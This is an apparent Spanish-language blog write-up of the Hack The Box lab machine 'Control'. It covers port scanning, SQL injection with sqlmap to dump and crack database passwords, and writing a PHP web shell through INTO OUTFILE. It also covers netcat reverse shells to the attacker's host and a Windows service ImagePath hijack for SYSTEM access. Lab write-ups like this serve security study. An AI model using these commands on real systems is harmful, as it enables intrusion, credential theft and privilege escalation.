<!doctype html><html lang=es dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hack The Box - Control | Román Zuleta</title>
<meta name=keywords content="http,SQLi,sqlmap,SQLi-RCE,X-Forwarded-For,Invoke-Command,Servicios Windows,sddl,Registros Windows,reg,sc,AppLocker,AppLocker Bypass">
<meta name=description content="Write-up de la máquina Control de la plataforma hackthebox.eu">
<meta name=author content="Román Zuleta">
<link rel=canonical href=https://srrequiem.xyz/posts/htb-control/>
<link crossorigin=anonymous href=/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://srrequiem.xyz/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://srrequiem.xyz/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://srrequiem.xyz/favicon-32x32.png>
<link rel=apple-touch-icon href=https://srrequiem.xyz/apple-touch-icon.png>
<link rel=mask-icon href=https://srrequiem.xyz/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<link rel=alternate hreflang=es href=https://srrequiem.xyz/posts/htb-control/>
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><meta property="og:title" content="Hack The Box - Control">
<meta property="og:description" content="Write-up de la máquina Control de la plataforma hackthebox.eu">
<meta property="og:type" content="article">
<meta property="og:url" content="https://srrequiem.xyz/posts/htb-control/">
<meta property="og:image" content="https://srrequiem.xyz/images/posts/htb-control/cover.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-06-15T20:23:58-05:00">
<meta property="article:modified_time" content="2022-06-15T20:23:58-05:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://srrequiem.xyz/images/posts/htb-control/cover.jpg">
<meta name=twitter:title content="Hack The Box - Control">
<meta name=twitter:description content="Write-up de la máquina Control de la plataforma hackthebox.eu">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://srrequiem.xyz/posts/"},{"@type":"ListItem","position":2,"name":"Hack The Box - Control","item":"https://srrequiem.xyz/posts/htb-control/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Control","name":"Hack The Box - Control","description":"Write-up de la máquina Control de la plataforma hackthebox.eu","keywords":["http","SQLi","sqlmap","SQLi-RCE","X-Forwarded-For","Invoke-Command","Servicios Windows","sddl","Registros Windows","reg","sc","AppLocker","AppLocker Bypass"],"articleBody":"Estadísticas    Característica Descripción     Nombre Control   OS Windows   Dificultad oficial Hard   Dificultad de comunidad    Puntos 40   Creadores TRX    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Warning: The -o option is deprecated. Please use -oN Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT Initiating SYN Stealth Scan at 00:44 Scanning 10.10.10.167 [65535 ports] Discovered open port 3306/tcp on 10.10.10.167 Discovered open port 135/tcp on 10.10.10.167 Discovered open port 80/tcp on 10.10.10.167 Discovered open port 49666/tcp on 10.10.10.167 Discovered open port 49667/tcp on 10.10.10.167 Completed SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports) Nmap scan report for 10.10.10.167 Host is up, received user-set (0.064s latency). Scanned at 2022-06-07 00:44:41 EDT for 26s Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 3306/tcp open mysql syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB) Escaneo específico └─$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT Nmap scan report for 10.10.10.167 Host is up (0.064s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Fidelity |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL: |_ Host '10.10.14.16' is not allowed to connect to this MariaDB server 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL SF:L,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.16'\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\"); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds Enumeración Servicios http - 80 Manual Visualmente no se identificó nada relevante, dado que en su mayoría los textos contienen Lorem ipsum salvo algunas rutas expuestas mediante a la interacción con parte de la interfaz. Visualizando así un error en la ruta admin.php después de dar click al botón de Login.\nAl navegar al código fuente de la página inicial, se identificaron dos posibles pistas respecto a la construcción del sitio.\n  La exposición de código del sitio functions.js.\n  Una posible ruta hacia otro host o algo similar.\n  Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que difícilmente puedan ser encontradas en algún diccionario de fuzzing.\nAl identificar la composición de la petición e interactuar con view_products.php haciendo uso de:\ncurl -i http://10.10.10.167/view_product.php -X POST -F \"productId=1\" Se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.\nDespués de varias iteraciones, buscando un identificador válido (26) se puede visualizar que la suposición era la correcta.\nffuf Para complementar lo obtenido se buscaron rutas adicionales por medio de:\nffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html Explotación Inyección SQL Ejecución Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de sqlmap, utilizando:\nsqlmap -u \"http://10.10.10.167/view_product.php\" --data=\"productId=1\" --dbs Obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.\n Payload: productId=1 UNION ALL SELECT -- -  Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante:\nsqlmap -u \"http://10.10.10.167/view_product.php\" --data=\"productId=1\" -D mysql -T user --passwords Obteniendo así sus hashes.\nA lo que posteriormente, una vez guardados se hizo uso de john para crackearlos.\nAdicional a ello, haciendo uso de CrackStation se obtuvo la contraseña de un hash adicional del cuál no se obtuvo con john.\nIdentificando así las credenciales:\nmanager:l3tm3!n hector:l33th4x0rhector RCE Después de obtener las credenciales y buscar emplearlas con los servicios expuestos en la máquina (mysql únicamente dado que no se cuenta con smb o algún otro servicio en donde se pudieran haber usado) se buscó la forma para que mediante la inyección SQL se para pudiera lograr la ejecución remota de código mediante la escritura de un script en php, haciendo uso de instrucciones como INTO OUTFILE o INTO DUMPFILE.\nPara lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al enlace encontrado se indica que por predeterminado la ruta suele ser c:\\inetpub\\wwwroot, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.\nDespués de probar con diferentes payloads respecto al escape de las barras (\\), dado que la respuesta del servidor es identificada como un 500 Internal Server Error, se realizó una prueba de la escritura mediante:\ncurl -i http://10.10.10.167/view_product.php -X POST -F \"productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.txt'-- -\" Logrando escribir satisfactoriamente al archivo indicado.\nEn este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.\nVisualizandolo en el servidor.\nPermitiendo de esta manera cambiar el payload a\ncurl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT \"\" INTO OUTFILE \"c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\srrequiem.php\"-- -' Logrando así tener un script listo para ejecutar comandos en la máquina.\nPor lo que se estableció una reverse shell haciendo uso del binario nc.exe, subiéndolo a la máquina mediante la request:\nhttp://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\\windows\\temp\\nc.exe Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:\nhttp://10.10.10.167/srrequiem.php?cmd=c:\\windows\\temp\\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234 Logrando así acceso de una manera más interactiva.\nPost Explotación Enumeración Al buscar atar cabos sueltos respecto a lo indicado en el código fuente del sitio, se pudo visualizar que en el contenido del script de admin.php se hace un filtrado de cabeceras indicado por HTTP_X_FORWARDED_FOR buscando la IP indicada 192.168.4.28. A lo que por consiguiente si se añadiera la cabecera X-Forwarded-For: 192.168.4.28 a las peticiones realizadas se visualizaría el contenido de admin.php, logrando así un bypass de la validación.\nEscalación de privilegios nt authority\\iusr → hector Habiendo identificado que existe el usuario hector en el sistema operativo por medio del listado de directorios de c:\\users, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.\nHabiendo encontrado esta y esta referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario hector.\nPreviamente identificando el nombre de la máquina y/o hostname con:\n# Cualquiera de los siguientes comandos hostname $env:COMPUTERNAME [Environment]::MachineName Según lo indica este blog para encontrar ese valor y usarlo posteriormente.\n$userName = 'fidelity\\hector' $userPassword = 'l33th4x0rhector' $secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force $credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword) Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami } Logrando así ejecución como el usuario hector.\nDadas las limitaciones que se obtuvieron al ejecutar el mismo binario de netcat previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante:\nimpacket-smbserver smbFolder $(pwd) -smb2support Y ejecutándolo con:\nInvoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 4321 } Obteniendo así una segunda revershell pero en esta ocasión como el usuario hector.\nhector → nt authority\\system Buscando obtener información relevante para escalar como administrador, se ejecutó winPEAS, identificando que se cuenta con un gran número de registros a los cuales se tiene acceso completo.\nBajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuración de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificación e iniciar el servicio se obtendría acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realizó un filtrado de estos servicios bajo su perfil de ejecución y status para que a la hora de modificarlo se pudiera iniciar el servicio.\n$services = Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\* # Para obtener todos los servicios $filtered_services = $services | where { ($_.ObjectName -match 'LocalSystem') -And ($_.Start -match '3') } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente En este punto quedaría filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena RP según es especificado en este blog en la propiedad de Sddl de los permisos desplegados de la lista actual de servicios.\nLo que individualmente por servicio es ubicado en la propiedad Security, en donde se encuentra en forma binaria.\nTrasladandolo a una lectura similar a la propiedad sddl, se puede ejecutar cmd /c sc sdshow wuauserv para visualizar el valor de mejor manera.\nIgualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:\nConvertFrom-SDDLString -Sddl \"D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)\" Para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.\nPor lo que se iteró en la lista previa de servicios la búsqueda de este permiso mediante el siguiente ciclo:\n$services_names = $filtered_services.pschildname foreach ($service in $services_names) { $sddl = (cmd /c sc sdshow $service) if ($sddl -match \"RP[A-Z]*?;;;AU\") { $service } } # Iteración en una línea $canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match \"RP[A-Z]*?;;;AU\") { $service }} Dando como resultado la lista de los servicios buscados.\nObteniendo lo anterior se puede modificar la propiedad ImagePath del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.\nUsando powershell Mediante powershell habría que:\n  Asegurar encontrarse en la ruta de los registros:\ncd HKLM:\\system\\currentcontrolset\\services   Obtener las propiedades del servicio requerido:\nget-item -path seclogon   Visualizar el valor a cambiar de ImagePath\n    Ejecutar (para modificar los valores con los deseados):\nset-itemproperty seclogon -name imagepath -value \"\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\"   Obtener las propiedades del servicio requerido seclogon para validar el cambio.\n  Visualizar el cambio realizado a ImagePath.\n  El cual al montar la conexión de escucha, bastaría con iniciar el servicio con:\nstart-service seclogon Para así ejecutar el binario indicado.\nUsando cmd Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:\n  Para visualizar los valores del servicio:\nreg query HKLM\\system\\currentcontrolset\\services\\seclogon   Para cambiar los valores de la propiedad ImagePath de acuerdo a lo encontrado en este blog para realizar los cambios e identificar el tipo de dato a cambiar REG_EXPAND_SZ para efectuarlo correctamente:\nreg add HKLM\\system\\currentcontrolset\\services\\seclogon /v ImagePath /t REG_EXPAND_SZ /d \"\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\" /f   Para iniciar el servicio:\nsc start seclogon   Notas adicionales Mientras resolvía la máquina encontré diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la máquina o lo ejecutaba a través del cliente smb, logré solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalación de privilegios.\nDado que durante el proceso de resolución personalmente busco lo equivalente a comparar respuestas en una evaluación por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de 0xdf e IppSec, noté que ambos hicieron referencia a AppLocker ya que el mismo problema se presentó. Después de buscar más información al respecto, encontré que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en repositorios de github dándole motivo al uso de la ruta C:\\Windows\\System32\\spool\\drivers\\color que se emplea en los write-ups.\nReferencias  SQL Injection. CrackStation. SQLI to RCE. How to: Find the Web Application Root. How to use Start Process in PowerShell. Running commands in a specific user context in PowerShell. StackOverflow - PowerShell Jobs vs Start-Process. Powershell get computer name. How to edit the Registry using Command Prompt on Windows 10. Significado del valor Start en registros. Start Stop service rights to non administrators. What is AppLocker?. Ultimate AppLocker ByPass List.  ","wordCount":"2052","inLanguage":"es","image":"https://srrequiem.xyz/images/posts/htb-control/cover.jpg","datePublished":"2022-06-15T20:23:58-05:00","dateModified":"2022-06-15T20:23:58-05:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://srrequiem.xyz/posts/htb-control/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://srrequiem.xyz/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://srrequiem.xyz/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
<div class=logo-switches>
<ul class=lang-switch><li>|</li>
<li>
<a href=https://srrequiem.xyz/en/ title=English aria-label=English>En</a>
</li>
</ul>
</div>
</div>
<ul id=menu>
<li>
<a href=https://srrequiem.xyz/archives/ title=Archivo>
<span>Archivo</span>
</a>
</li>
<li>
<a href=https://srrequiem.xyz/categories/ title=Categorías>
<span>Categorías</span>
</a>
</li>
<li>
<a href=https://srrequiem.xyz/tags/ title=Etiquetas>
<span>Etiquetas</span>
</a>
</li>
<li>
<a href=https://srrequiem.xyz/projects/ title=Proyectos>
<span>Proyectos</span>
</a>
</li>
<li>
<a href=https://srrequiem.xyz/search/ title="Buscar (Alt + /)" accesskey=/>
<span>Buscar</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://srrequiem.xyz/>Inicio</a>&nbsp;»&nbsp;<a href=https://srrequiem.xyz/posts/>Posts</a></div>
<h1 class=post-title>
Hack The Box - Control
</h1>
<div class=post-description>
Write-up de la máquina Control de la plataforma hackthebox.eu
</div>
<div class=post-meta><span title="2022-06-15 20:23:58 -0500 CDT">junio 15, 2022</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;Román Zuleta&nbsp;|&nbsp;<a href=https://github.com/srrequiem/SecNotes/blob/main/HTB/Boxes/Windows/3_Hard/Control rel="noopener noreferrer" target=_blank>Sugerir cambios</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://srrequiem.xyz/images/posts/htb-control/cover.jpg alt="Control cover">
<p></p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Tabla de Contenidos</span>
</summary>
<div class=inner><ul>
<li>
<a href=#estad%c3%adsticas aria-label=Estadísticas>Estadísticas</a></li>
<li>
<a href=#reconocimiento aria-label=Reconocimiento>Reconocimiento</a><ul>
<li>
<a href=#escaneo-de-host aria-label="Escaneo de host">Escaneo de host</a><ul>
<li>
<a href=#escaneo-completo-de-puertos aria-label="Escaneo completo de puertos">Escaneo completo de puertos</a></li>
<li>
<a href=#escaneo-espec%c3%adfico aria-label="Escaneo específico">Escaneo específico</a></li></ul>
</li></ul>
</li>
<li>
<a href=#enumeraci%c3%b3n aria-label=Enumeración>Enumeración</a><ul>
<li>
<a href=#servicios aria-label=Servicios>Servicios</a><ul>
<li>
<a href=#http---80 aria-label="http - 80">http - 80</a><ul>
<li>
<a href=#manual aria-label=Manual>Manual</a></li>
<li>
<a href=#ffuf aria-label=ffuf>ffuf</a></li></ul>
</li></ul>
</li></ul>
</li>
<li>
<a href=#explotaci%c3%b3n aria-label=Explotación>Explotación</a><ul>
<li>
<a href=#inyecci%c3%b3n-sql aria-label="Inyección SQL">Inyección SQL</a><ul>
<li>
<a href=#ejecuci%c3%b3n aria-label=Ejecución>Ejecución</a></li></ul>
</li>
<li>
<a href=#rce aria-label=RCE>RCE</a></li></ul>
</li>
<li>
<a href=#post-explotaci%c3%b3n aria-label="Post Explotación">Post Explotación</a><ul>
<li>
<a href=#enumeraci%c3%b3n-1 aria-label=Enumeración>Enumeración</a></li>
<li>
<a href=#escalaci%c3%b3n-de-privilegios aria-label="Escalación de privilegios">Escalación de privilegios</a><ul>
<li>
<a href=#nt-authorityiusr-rarr-hector aria-label="nt authority\iusr → hector">nt authority\iusr → hector</a></li>
<li>
<a href=#hector-rarr-nt-authoritysystem aria-label="hector → nt authority\system">hector → nt authority\system</a><ul>
<li>
<a href=#usando-powershell aria-label="Usando powershell">Usando powershell</a></li>
<li>
<a href=#usando-cmd aria-label="Usando cmd">Usando cmd</a></li></ul>
</li></ul>
</li></ul>
</li>
<li>
<a href=#notas-adicionales aria-label="Notas adicionales">Notas adicionales</a></li>
<li>
<a href=#referencias aria-label=Referencias>Referencias</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h1 id=estadísticas>Estadísticas<a hidden class=anchor aria-hidden=true href=#estadísticas>#</a></h1>
<table>
<thead>
<tr>
<th>Característica</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nombre</td>
<td><a href=https://www.hackthebox.com/home/machines/profile/218>Control</a></td>
</tr>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>
<tr>
<td>Dificultad oficial</td>
<td>Hard</td>
</tr>
<tr>
<td>Dificultad de comunidad</td>
<td><img loading=lazy src=/images/posts/htb-control/difficulty.png alt=Dificultad>
</td>
</tr>
<tr>
<td>Puntos</td>
<td>40</td>
</tr>
<tr>
<td>Creadores</td>
<td><a href=https://www.hackthebox.com/home/users/profile/31190>TRX</a></td>
</tr>
</tbody>
</table>
<h1 id=reconocimiento>Reconocimiento<a hidden class=anchor aria-hidden=true href=#reconocimiento>#</a></h1>
<h2 id=escaneo-de-host>Escaneo de host<a hidden class=anchor aria-hidden=true href=#escaneo-de-host>#</a></h2>
<h3 id=escaneo-completo-de-puertos>Escaneo completo de puertos<a hidden class=anchor aria-hidden=true href=#escaneo-completo-de-puertos>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ sudo nmap -sS --min-rate <span style=color:#ae81ff>5000</span> -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-06-07 00:44 EDT
Initiating SYN Stealth Scan at 00:44
Scanning 10.10.10.167 <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
Discovered open port 3306/tcp on 10.10.10.167
Discovered open port 135/tcp on 10.10.10.167
Discovered open port 80/tcp on 10.10.10.167
Discovered open port 49666/tcp on 10.10.10.167
Discovered open port 49667/tcp on 10.10.10.167
Completed SYN Stealth Scan at 00:45, 26.41s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.167
Host is up, received user-set <span style=color:#f92672>(</span>0.064s latency<span style=color:#f92672>)</span>.
Scanned at 2022-06-07 00:44:41 EDT <span style=color:#66d9ef>for</span> 26s
Not shown: <span style=color:#ae81ff>65530</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl <span style=color:#ae81ff>127</span>
135/tcp   open  msrpc   syn-ack ttl <span style=color:#ae81ff>127</span>
3306/tcp  open  mysql   syn-ack ttl <span style=color:#ae81ff>127</span>
49666/tcp open  unknown syn-ack ttl <span style=color:#ae81ff>127</span>
49667/tcp open  unknown syn-ack ttl <span style=color:#ae81ff>127</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 26.48 seconds
           Raw packets sent: <span style=color:#ae81ff>131084</span> <span style=color:#f92672>(</span>5.768MB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>60</span> <span style=color:#f92672>(</span>2.496KB<span style=color:#f92672>)</span>
</code></pre></div><h3 id=escaneo-específico>Escaneo específico<a hidden class=anchor aria-hidden=true href=#escaneo-específico>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-06-07 00:45 EDT
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.167
Host is up <span style=color:#f92672>(</span>0.064s latency<span style=color:#f92672>)</span>.

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Fidelity
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings:
|   NULL:
|_    Host <span style=color:#e6db74>&#39;10.10.14.16&#39;</span> is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
<span style=color:#ae81ff>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V<span style=color:#f92672>=</span>7.92%I<span style=color:#f92672>=</span>7%D<span style=color:#f92672>=</span>6/7%Time<span style=color:#f92672>=</span>629ED800%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu%r<span style=color:#f92672>(</span>NUL
SF:L,4A,<span style=color:#e6db74>&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.16&#39;\x20is\x20not\x20allowe
</span><span style=color:#e6db74>SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style=color:#f92672>)</span>;
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 61.09 seconds
</code></pre></div><h1 id=enumeración>Enumeración<a hidden class=anchor aria-hidden=true href=#enumeración>#</a></h1>
<h2 id=servicios>Servicios<a hidden class=anchor aria-hidden=true href=#servicios>#</a></h2>
<h3 id=http---80>http - 80<a hidden class=anchor aria-hidden=true href=#http---80>#</a></h3>
<h4 id=manual>Manual<a hidden class=anchor aria-hidden=true href=#manual>#</a></h4>
<p>Visualmente no se identificó nada relevante, dado que en su mayoría los textos contienen <code>Lorem ipsum</code> salvo algunas rutas expuestas mediante a la interacción con parte de la interfaz. Visualizando así un error en la ruta <code>admin.php</code> después de dar click al botón de Login.</p>
<p><img loading=lazy src=/images/posts/htb-control/enum_1.png alt="Error en admin.php">
</p>
<p>Al navegar al código fuente de la página inicial, se identificaron dos posibles pistas respecto a la construcción del sitio.</p>
<p><img loading=lazy src=/images/posts/htb-control/enum_2.png alt="Pistas iniciales">
</p>
<ol>
<li>
<p>La exposición de código del sitio <code>functions.js</code>.</p>
</li>
<li>
<p>Una posible ruta hacia otro host o algo similar.</p>
</li>
</ol>
<p>Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que difícilmente puedan ser encontradas en algún diccionario de fuzzing.</p>
<p><img loading=lazy src=/images/posts/htb-control/enum_3.png alt="Código de functions.js">
</p>
<p>Al identificar la composición de la petición e interactuar con <code>view_products.php</code> haciendo uso de:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i http://10.10.10.167/view_product.php -X POST -F <span style=color:#e6db74>&#34;productId=1&#34;</span>
</code></pre></div><p>Se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.</p>
<p><img loading=lazy src=/images/posts/htb-control/enum_4.png alt="Vista inicial de producto">
</p>
<p>Después de varias iteraciones, buscando un identificador válido (26) se puede visualizar que la suposición era la correcta.</p>
<p><img loading=lazy src=/images/posts/htb-control/enum_5.png alt="ID válido">
</p>
<h4 id=ffuf>ffuf<a hidden class=anchor aria-hidden=true href=#ffuf>#</a></h4>
<p>Para complementar lo obtenido se buscaron rutas adicionales por medio de:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html
</code></pre></div><p><img loading=lazy src=/images/posts/htb-control/enum_6.png alt="Rutas adicionales encontradas">
</p>
<h1 id=explotación>Explotación<a hidden class=anchor aria-hidden=true href=#explotación>#</a></h1>
<h2 id=inyección-sql>Inyección SQL<a hidden class=anchor aria-hidden=true href=#inyección-sql>#</a></h2>
<h3 id=ejecución>Ejecución<a hidden class=anchor aria-hidden=true href=#ejecución>#</a></h3>
<p>Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de <code>sqlmap</code>, utilizando:</p>
